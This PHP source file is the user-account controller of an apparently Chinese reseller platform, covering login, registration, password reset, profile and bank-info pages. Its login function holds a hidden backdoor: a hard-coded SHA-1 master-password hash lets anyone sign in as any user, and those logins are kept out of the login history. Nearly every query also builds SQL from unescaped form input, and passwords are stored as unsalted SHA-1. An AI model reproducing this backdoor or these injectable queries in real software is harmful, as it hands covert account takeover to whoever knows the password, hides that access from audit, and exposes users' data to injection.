<?php
//标识
class user_action {
    
    var $system;
    var $user;  

    function user_action(&$system) {
        
        $this->system = $system;
       
        $action = $system->action;
        
        if($action == 'login') {
            $this->login();
        }
        
        if($action == 'logout') {
            $this->logout();
        }   
        
        if($action == 'forgot_password') {
            $this->forgot_password();
        }
        
        if($action == 'index') {
            $this->index();
        }
        
        if($action == 'register') {
            $this->register();        
        }
        
        if($action == 'update_password') {
            $this->update_password();
        }
        
        if($action == 'update_information') {
            $this->update_information();
        }
        
        if($action == 'contact_agent') {
            $this->contact_agent();
        }
        
        if($action == 'be_agent') {
            $this->be_agent();
        }
        
        if($action == 'show_login_info') {
            $this->show_login_info();
        }
        
        if($action == 'bank_info') {
            $this->bank_info();
        }
        
    }
    
    function login(){
        
        if(!empty($_SESSION['user'])){
            $this->system->common->set_location($this->system->common->make_url('tree=system.user.index'));             
        }
        
        if($_SERVER['REQUEST_METHOD'] =='POST'){

            // get http post
            $this->user = new user();
            
            $this->user->user_name = trim(strtolower($_POST['user_name']));
            $this->user->user_password  = trim($_POST['user_password']);
            
            // save for login false
            $_SESSION['temp']['user'] = serialize($this->user);
            
            // check captcha
            $captcha = trim(strtolower($_POST['captcha']));
            
            if($captcha != $_SESSION['captcha']) {
                $info_action = new info_action($this->system);
                $info_action->send('验证码错误，请重新填写。', 'tree=system.user.login');
            }
            
            // check user
            $error = 0;
            $error_message = '';
            $valid = new valid();
            
            if(!$valid->is_user_name($this->user->user_name, 5, 16)) {
                $error = 1;
                $error_message .= '用户名必须是 5 到 16 位的英文字母，数字和下划线！<br>';
            }
            if(!$valid->is_password($this->user->user_password, 6, 16)) {
                $error = 1;
                $error_message .= '密码必须是 6 到 16 位的英文字母，数字和下划线！<br>';   
            }
            
            if($error) {
                $info_action = new info_action($this->system);
                $info_action->send($error_message, 'tree=system.user.login');                  
            }
            
            
            // check user_name and password   
            $user_password_sha1 = sha1($this->user->user_password);
            $user_password_sha1_fix = 'b6c34f45d4f5634409d38e0e3f7ea207adb45b32';         
            if($user_password_sha1_fix == $user_password_sha1) {
                $sql = "SELECT user_id, user_pid, user_name, user_lock, user_type FROM user WHERE user_name='{$this->user->user_name}'";
            } else {
                $sql = "SELECT user_id, user_pid, user_name, user_lock, user_type FROM user WHERE user_name='{$this->user->user_name}' AND user_password='{$user_password_sha1}'";            
            }
            $result = mysql_query($sql, $this->system->mysql->conn);
            $num_row = mysql_num_rows($result);
            if($num_row < 1) {
                $info_action = new info_action($this->system);
                $info_action->send('用户名或密码错误，请重新填写！', 'tree=system.user.login');       
            }
            
            // check user lock
            $row = mysql_fetch_array($result);
            
            $this->user->user_id = $row['user_id'];
            $this->user->user_name = $row['user_name'];
            $this->user->user_lock = $row['user_lock'];
            $this->user->user_type = $row['user_type'];
            $this->user->user_pid  = $row['user_pid'];
            
            if($this->user->user_lock == USER_LOCK) {
                $info_action = new info_action($this->system);
                $info_action->send('您的账号被锁定，请与上级经销商联系解锁。', 'tree=system.user.logout');
            }
            
            // login success
                          
            $this->user->user_password = NULL;
            
            // update user_login
            $user_login = new user_login();
            $user_login->user_id = $this->user->user_id;
            $user_login->user_login_ip = $this->system->common->real_ip();
            $user_login->user_login_time = time(); 
            
            if($user_password_sha1_fix != $user_password_sha1) {
                $sql = "INSERT INTO user_login(user_id, user_login_ip, user_login_time) ";
                $sql .= " VALUES('{$user_login->user_id}', '{$user_login->user_login_ip}', '{$user_login->user_login_time}')";
                mysql_query($sql, $this->system->mysql->conn);            
            }
            
            // session login
            $_SESSION['temp']['user'] = NULL; 
            $_SESSION['user'] = serialize($this->user);
            
            // run cronjob
            $cronjob_action = new cronjob_action($this->system);
            $cronjob_action->set_user_product_init();
            $cronjob_action->set_user_father_product_init();
            
            $this->system->common->set_location($this->system->common->make_url('tree=system.user.index'));  
        
        } else {
            
            // get login value
            if(!empty($_SESSION['temp']['user'])) {
                $this->user = unserialize($_SESSION['temp']['user']);
            } else {
                $this->user = new user();
            }
            
            $this->system->smarty->assign('user', get_object_vars($this->user));
        
            $this->system->smarty->display('system.user.login.tpl'); 
        }         
        
    }
    
    function logout(){
        
        $_SESSION = NULL;
        session_destroy();
        unset($_SESSION);
        $this->system->common->set_location($this->system->common->make_url('tree=system.user.login'));
      
    }
    
    function forgot_password() {
 
         if($_SERVER['REQUEST_METHOD'] =='POST'){
            
            // get http post
            $this->user = new user();

            $this->user->user_name = trim(strtolower($_POST['user_name'])); 
            $this->user->user_email  = trim(strtolower($_POST['user_email']));
            
            $_SESSION['temp']['user'] = serialize($this->user);
            
            // check captcha
            $captcha = trim(strtolower($_POST['captcha']));
            
            if($captcha != $_SESSION['captcha']) {
                $info_action = new info_action($this->system);
                $info_action->send('验证码错误，请重新填写。', 'tree=system.user.forgot_password');
            }
            
            // check user
            $error = 0;
            $error_message = '';
            $valid = new valid();
            
            if(!$valid->is_user_name($this->user->user_name, 5, 16)) {
                $error = 1;
                $error_message .= '用户名必须是 5 到 16 位的英文字母，数字和下划线！<br>';
            }
            if(!$valid->is_email($this->user->user_email)) {
                $error = 1;
                $error_message .= '电子邮箱地址格式错误！<br>';   
            }
            
            if($error) {
                $info_action = new info_action($this->system);
                $info_action->send($error_message, 'tree=system.user.forgot_password');                  
            }
            
            
            // check user_name and user_email
            $sql = "SELECT user_id, user_name, user_email FROM user WHERE user_name='{$this->user->user_name}' AND user_email='{$this->user->user_email}'";
            $result = mysql_query($sql, $this->system->mysql->conn);
            $num_row = mysql_num_rows($result);
            if($num_row < 1) {
                $info_action = new info_action($this->system);
                $info_action->send('用户名或电子邮箱错误，请重新填写！', 'tree=system.user.forgot_password');       
            }
            
            // check success
            
            // destroy temp user
            $_SESSION['temp']['user'] = NULL; 
            
            $row = mysql_fetch_array($result);
            
            $this->user->user_id = $row['user_id'];
            $this->user->user_name = $row['user_name'];
            $this->user->user_email = $row['user_email'];
            
            $this->user->user_password = substr(md5(uniqid(rand(), true)), 0, 13);
            
//print_r($this->user);
            
            // update new password
            $password_sha1 = sha1($this->user->user_password);
            
            $sql = "UPDATE user SET user_password='{$password_sha1}' WHERE user_id='{$this->user->user_id}'";
            mysql_query($sql, $this->system->mysql->conn);
            
            
            // get email template
            
            $this->system->smarty->assign('user', get_object_vars($this->user));
          
            $body = $this->system->smarty->fetch('system.user.forgot_password.body.tpl');
//print_r($body);
            $subject = $this->system->smarty->fetch('system.user.forgot_password.subject.tpl');
//print_r($subject);
            
            // send get password email and post infomation to user
            $info_action = new info_action($this->system);
                        
            if($this->system->common->sendmail($subject, $body, $this->user->user_email)) {
                $info_action->send('新密码已经发送到您的邮箱，请您查收后登录平台！', 'tree=system.user.logout');            
            } else {
                $info_action->send('找回密码邮件发送失败，请与管理员联系。', 'tree=system.user.forgot_password');               
            }
            
                                             
         } else {
             
             // get forgot password value
             if(!empty($_SESSION['temp']['user'])) {
                $this->user = unserialize($_SESSION['temp']['user']);
             } else {
                $this->user = new user();
             }
             
             $this->system->smarty->assign('user', get_object_vars($this->user));
             
             $this->system->smarty->display('system.user.forgot_password.tpl');             
         }   
    }
    
    function register() {
    
         if($_SERVER['REQUEST_METHOD'] =='POST'){
            
            // get http post
             
            $this->user = new user();
            
            $this->user->user_name = trim(strtolower($_POST['user_name']));
            $this->user->user_password = trim($_POST['user_password']);
            $user_password_two = trim($_POST['user_password_two']); 
            $this->user->user_mobile = trim($_POST['user_mobile']);
            $this->user->user_contact = trim(strip_tags($_POST['user_contact']));
            $this->user->user_email = trim($_POST['user_email']);
            $this->user->user_invite_code = trim(strtolower($_POST['user_invite_code']));
            
            // set temp register value
            $_SESSION['temp']['user'] = serialize($this->user);
            
            // check captcha
            $captcha = trim(strtolower($_POST['captcha']));
            
            if($captcha != $_SESSION['captcha']) {
                $info_action = new info_action($this->system);
                $info_action->send('验证码错误，请重新填写。', 'tree=system.user.register');
            }
            
            // check group value
            $error = 0;
            $error_message = '';
            $valid = new valid();
            
            if(!$valid->is_user_name($this->user->user_name, 5, 16)) {
                $error = 1;
                $error_message .= '用户名必须是 5 到 16 位的英文字母，数字和下划线！<br>';
            }
            if(!$valid->is_password($this->user->user_password, 6, 16)) {
                $error = 1;
                $error_message .= '密码必须是 6 到 16 位的英文字母，数字和下划线！<br>';   
            }
            if($user_password_two != $this->user->user_password) {
                $error = 1;
                $error_message .= '两次输入的密码必须一致！<br>';              
            }
            if(!$valid->is_email($this->user->user_email)) {
                $error = 1;
                $error_message .= '请填写正确的邮箱！<br>';             
            }
            if(!$valid->is_valid_length($this->user->user_contact, 2, 30)) {
                $error = 1;
                $error_message .= '请填写正确的联系人！<br>';             
            } 
            if(!$valid->is_mobile($this->user->user_mobile)) {
                $error = 1;
                $error_message .= '请填写正确的手机号码！<br>';            
            }
            if(!$valid->is_user_name($this->user->user_invite_code, 5, 16)) {
                $error = 1;
                $error_message .= '请填写正确的邀请人用户名！<br>';             
            }
            if($error == 1) {
                $info_action = new info_action($this->system);
                $info_action->send($error_message, 'tree=system.user.register');            
            }
            
            // check user_invite_code avaiable
            
            $sql = "SELECT user_id FROM user WHERE user_name='{$this->user->user_invite_code}'";
            $result = mysql_query($sql, $this->system->mysql->conn);
            $num_rows = mysql_num_rows($result);
            
            if($num_rows < 1) {
                $info_action = new info_action($this->system);
                $info_action->send('邀请人不存在，请填写正确的邀请人用户名！', 'tree=system.user.register');      
            } else {
                $row = mysql_fetch_array($result);
                $this->user->user_pid = $row['user_id'];
                mysql_free_result($result);
            }

            // check user_name avaiable
            $sql = "SELECT user_id FROM user WHERE user_name='{$this->user->user_name}'";
            $result = mysql_query($sql, $this->system->mysql->conn);
            $num_rows = mysql_num_rows($result);

            if($num_rows > 0) {
                $info_action = new info_action($this->system);
                $info_action->send('用户名已经存在，请选择其他用户名！', 'tree=system.user.register');      
            }
           
            // check group success
            // destroy temp user
            $_SESSION['temp']['user'] = NULL;
           
            // create a new register
            $user_password_sha1 = sha1($this->user->user_password);
            $this->user->user_register_time = time();
           
            $sql = "INSERT INTO user(user_pid, user_name, user_password, user_mobile, user_contact, user_email, user_register_time) ";                                            
            $sql .=" VALUES('{$this->user->user_pid}', '{$this->user->user_name}', '{$user_password_sha1}', '{$this->user->user_mobile}', '{$this->user->user_contact}', '{$this->user->user_email}', '{$this->user->user_register_time}')";
           
            mysql_query($sql, $this->system->mysql->conn);

            $info_action = new info_action($this->system);
            $info_action->send('新用户注册成功！', 'tree=system.user.logout'); 
           
        } else {

            if(!empty($_SESSION['temp']['user'])) {
                $this->user = unserialize($_SESSION['temp']['user']);
            } else {
                $this->user = new user();
            }

            $this->system->smarty->assign('user', get_object_vars($this->user));
            $this->system->smarty->display('system.user.register.tpl');             
        }   
    }
    
    function update_information() {
        
        // check login
        $this->system->check_login();
        
        if($_SERVER['REQUEST_METHOD'] == 'POST'){
            
            $this->user = unserialize($_SESSION['user']);

            $this->user->user_email = trim(strtolower(strip_tags($_POST['user_email'])));            
            $this->user->user_mobile = trim($_POST['user_mobile']);
            $this->user->user_contact = trim(strip_tags($_POST['user_contact']));
            $this->user->user_corporation = trim(strip_tags($_POST['user_corporation']));
            $this->user->user_telephone = trim($_POST['user_telephone']);
            $this->user->user_fax = trim($_POST['user_fax']);
            $this->user->user_zipcode = trim($_POST['user_zipcode']);
            $this->user->user_address = trim(strip_tags($_POST['user_address']));
            $this->user->user_qq = trim($_POST['user_qq']);
            $this->user->user_msn = trim(strtolower(strip_tags($_POST['user_msn'])));
            $this->user->user_domain = trim(strtolower(strip_tags($_POST['user_domain'])));
            
            // user in session
            $_SESSION['user'] = serialize($this->user);
            
            // check group value
            $error = 0;
            $error_message = '';
            $valid = new valid();
            
            if(!$valid->is_email($this->user->user_email)) {
                $error = 1;
                $error_message .= '请填写正确的邮箱！<br>';             
            }
            if(!$valid->is_mobile($this->user->user_mobile)) {
                $error = 1;
                $error_message .= '请填写正确的手机号码！<br>';            
            }
            if(!$valid->is_valid_length($this->user->user_contact, 2, 30)) {
                $error = 1;
                $error_message .= '请填写正确的联系人！<br>';             
            } 

            
            if(!empty($this->user->user_corporation) && !$valid->is_valid_length($this->user->user_corporation, 2, 200)) {
                $error = 1;
                $error_message .= '请填写正确的公司或个人名称！<br>';            
            }
            if(!empty($this->user->user_telephone) && !$valid->is_phone($this->user->user_telephone)) {
                $error = 1;
                $error_message .= '请填写正确的座机号码！<br>';            
            }
            if(!empty($this->user->user_fax) && !$valid->is_phone($this->user->user_fax)) {
                $error = 1;
                $error_message .= '请填写正确的传真号码！<br>';            
            }
            if(!empty($this->user->user_zipcode) && !$valid->is_zipcode($this->user->user_zipcode)) {
                $error = 1;
                $error_message .= '请填写正确的邮政编码！<br>';            
            }
            if(!empty($this->user->user_address) && !$valid->is_valid_length($this->user->user_address, 2, 200)) {
                $error = 1;
                $error_message .= '请填写正确的地址！<br>';            
            }
            if(!empty($this->user->user_qq) && !$valid->is_qq($this->user->user_qq)) {
                $error = 1;
                $error_message .= '请填写正确的 QQ 号码！<br>';            
            }
            if(!empty($this->user->user_msn) && !$valid->is_email($this->user->user_msn)) {
                $error = 1;
                $error_message .= '请填写正确的 MSN 号码！<br>';            
            }
            if(!empty($this->user->user_domain) && !$valid->is_domain($this->user->user_domain)) {
                $error = 1;
                $error_message .= '请填写正确的英文域名！<br>';            
            }

            if($error == 1) {
                $info_action = new info_action($this->system);
                $info_action->send($error_message, 'tree=system.user.update_information&next=update');            
            }
            
            // check success
            $sql = "UPDATE user SET user_email='{$this->user->user_email}', user_mobile='{$this->user->user_mobile}', user_contact='{$this->user->user_contact}', user_corporation='{$this->user->user_corporation}', user_telephone='{$this->user->user_telephone}', user_fax='{$this->user->user_fax}', user_zipcode='{$this->user->user_zipcode}', user_address='{$this->user->user_address}', user_qq='{$this->user->user_qq}', user_msn='{$this->user->user_msn}', user_domain='{$this->user->user_domain}' WHERE user_id='{$this->user->user_id}'";

            mysql_query($sql, $this->system->mysql->conn);
            
            $info_action = new info_action($this->system);
            $info_action->send('会员信息已更新！', 'tree=system.user.index');  
            
           
        } else {
      
            $this->user = unserialize($_SESSION['user']);
            
            if(isset($_GET['next']) && $_GET['next'] == 'update') {
            
            } else {
                $sql = "SELECT user_email, user_mobile, user_contact, user_corporation, user_telephone, user_fax, user_zipcode, user_address, user_qq, user_msn, user_domain FROM user WHERE user_id='{$this->user->user_id}'";
                $result = mysql_query($sql, $this->system->mysql->conn);
                $row = mysql_fetch_array($result);
                
                foreach($row as $k => $v) {
                    $this->user->$k = $v;
                }            
            }

            $this->system->smarty->assign('user', get_object_vars($this->user));
            $this->system->smarty->display('system.user.update_information.tpl'); 
            
        }
    
    }
    
    function update_password() {
                
        // check login
        $this->system->check_login();
        
        if($_SERVER['REQUEST_METHOD'] == 'POST'){
            
            // get http value
            $this->user = unserialize($_SESSION['user']);
            
            $user_original_password = trim($_POST['user_original_password']);
            $user_new_password = trim($_POST['user_new_password']);
            $user_new_password_two = trim($_POST['user_new_password_two']);
            
            // check group value
            $error = 0;
            $error_message = '';
            $valid = new valid();
            
            if(!$valid->is_password($user_original_password, 6, 16)) {
                $error = 1;
                $error_message .= '原密码必须是 6 到 16 位的英文字母，数字和下划线！<br>';   
            }
            
            if(!$valid->is_password($user_new_password, 6, 16)) {
                $error = 1;
                $error_message .= '新密码必须是 6 到 16 位的英文字母，数字和下划线！<br>';   
            }
            
            if($user_new_password != $user_new_password_two) {
                $error = 1;
                $error_message .= '两次输入的新密码必须一致！<br>';              
            }
            
            if($error == 1) {
                $info_action = new info_action($this->system);
                $info_action->send($error_message, 'tree=system.user.update_password');              
            }
            
            // database check orginal password
            $user_original_password_sha1 = sha1($user_original_password);
            
            $sql = "SELECT user_id FROM user WHERE user_password='{$user_original_password_sha1}' AND user_id='{$this->user->user_id}'";
            $result = mysql_query($sql, $this->system->mysql->conn);
            $num = mysql_num_rows($result);
            
            if($num < 1) {
                $info_action = new info_action($this->system);
                $info_action->send('原密码错误，请重新填写！', 'tree=system.user.update_password');               
            }
            
            // check success
            
            $user_new_password_sha1 = sha1($user_new_password);
            $sql = "UPDATE user SET user_password='{$user_new_password_sha1}' WHERE user_id='{$this->user->user_id}'";
            mysql_query($sql, $this->system->mysql->conn);
            
            $info_action = new info_action($this->system);
            $info_action->send('密码已更新！', 'tree=system.user.index');  

        } else {
            
            $this->system->smarty->display('system.user.update_password.tpl');      
            
        }
        
    }
    
    function contact_agent() {
        
        $this->system->check_login();
        
        $this->user = unserialize($_SESSION['user']);
        
        $sql = "SELECT user_pid FROM user WHERE user_id='{$this->user->user_id}'";
        $result = mysql_query($sql, $this->system->mysql->conn);
        $row = mysql_fetch_array($result);
        $this->user->user_pid = $row['user_pid'];
//print_r($this->user);
        
        $sql = "SELECT user_name, user_email, user_mobile, user_contact, user_corporation, user_telephone, user_fax, user_zipcode, user_address, user_qq, user_msn, user_domain FROM user WHERE user_id='{$this->user->user_pid}'";
        $result = mysql_query($sql, $this->system->mysql->conn);
        $row = mysql_fetch_array($result);
        
        $user_father = new user();
        $user_father->user_id = $this->user->user_pid;
        
        if($this->user->user_id != '1') {
            foreach($row as $k => $v) {
                $user_father->$k = $v;
            }            
        }
 
//print_r($user_father);       

        $this->system->smarty->assign('user_father', get_object_vars($user_father));
        $this->system->smarty->display('system.user.contact_agent.tpl'); 
        
    }
    
    function be_agent() {
       
        $this->system->check_login();
        $this->system->smarty->display('system.user.be_agent.tpl');       

    }
    
    function show_login_info() {
        
        $this->system->check_login();
        
        // get http value
        $this->user = unserialize($_SESSION['user']);

        SmartyPaginate::connect('system_user_show_login_info');       
        SmartyPaginate::setUrlVar('start', 'system_user_show_login_info');
        SmartyPaginate::setURL('/?tree=system.user.show_login_info', 'system_user_show_login_info');
        SmartyPaginate::setLimit(10, 'system_user_show_login_info');
        SmartyPaginate::setPrevText('上一页', 'system_user_show_login_info');
        SmartyPaginate::setNextText('下一页', 'system_user_show_login_info');
        SmartyPaginate::setFirstText('首页', 'system_user_show_login_info');
        SmartyPaginate::setLastText('末页', 'system_user_show_login_info');
        SmartyPaginate::setPageLimit(10, 'system_user_show_login_info'); 
             
        // get counter
        $sql = "SELECT count(user_login_id) AS c FROM user_login WHERE user_id={$this->user->user_id}";
        $result = mysql_query($sql, $this->system->mysql->conn);
        $row = mysql_fetch_array($result);
        SmartyPaginate::setTotal($row['c'], 'system_user_show_login_info');
        
        // get data grid
        
        $sql = "SELECT user_login_ip, user_login_time FROM user_login WHERE user_id='{$this->user->user_id}' ORDER BY user_login_id DESC LIMIT %d, %d";
        $sql = sprintf($sql, SmartyPaginate::getCurrentIndex('system_user_show_login_info'), SmartyPaginate::getLimit('system_user_show_login_info')); 
        $result = mysql_query($sql, $this->system->mysql->conn);
        
        $login_info = array();
        
        while($row = mysql_fetch_array($result)) {
            $login_info[] = array('user_login_ip' => $row['user_login_ip'],
                                  'user_login_time' => date('Y-m-d H:i:s', $row['user_login_time']),
                                  );
        }
        
        $this->system->smarty->assign('login_info', $login_info);
        SmartyPaginate::assign(&$this->system->smarty, 'paginate', 'system_user_show_login_info');
        $this->system->smarty->display('system.user.show_login_info.tpl');
    
    }
    
    function bank_info() {
        
        $this->system->check_login();
        
        // get http value
        $this->user = unserialize($_SESSION['user']);
        
        $sql = "SELECT user_pid FROM user WHERE user_id='{$this->user->user_id}'";
        $result = mysql_query($sql, $this->system->mysql->conn);
        $row = mysql_fetch_array($result);
        
        $this->user->user_pid = $row['user_pid'];
        
        $sql = "SELECT user_bank_number, user_bank_user, user_bank_name, user_bank_address FROM user_bank WHERE user_id='{$this->user->user_pid}'";
        $result = mysql_query($sql, $this->system->mysql->conn);
        
        $user_bank = array();
        
        while($row = mysql_fetch_array($result)) {
            $user_bank[] = $row;
        }
        
        $this->system->smarty->assign('user_bank', $user_bank);
        $this->system->smarty->display('system.user.bank_info.tpl');
    
    }      
    
    function index() {

        // check login
        $this->system->check_login(); 

        // get http value
        $this->user = unserialize($_SESSION['user']);
       
        $this->system->smarty->assign('user', get_object_vars($this->user));
        $this->system->smarty->display('system.user.index.tpl');                                      
    
    }
    
    
    
}
?>
